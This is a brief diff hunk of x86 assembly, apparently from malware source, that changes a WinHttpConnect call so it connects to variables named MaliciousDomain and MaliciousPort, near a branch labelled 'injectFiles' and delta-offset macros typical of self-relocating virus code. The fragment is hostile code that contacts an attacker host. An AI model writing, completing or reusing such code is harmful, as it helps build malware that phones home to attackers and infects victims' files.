@@ -76,7 +76,7 @@ mov	[DELTA HttpSession], eax
 cmp	eax, 0
 je	injectFiles
 push	0
-push	0
+PVDELTA MaliciousPort
 PDELTA	MaliciousDomain
 PVDELTA	HttpSession
 call	[DELTA pWinHttpConnect]
